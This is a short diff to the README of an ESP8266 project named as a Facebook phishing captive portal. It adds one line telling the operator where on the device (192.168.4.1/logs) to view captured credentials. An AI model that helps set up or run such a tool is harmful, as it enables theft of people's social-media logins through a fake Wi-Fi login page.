@@ -1,6 +1,7 @@
 # ESP8266-Facebook Phishing-Captive-Portal
 Use Arduino IDE.
 
+To see captured credentials: 192.168.4.1/logs
 
 Download Zip and Extract.
 
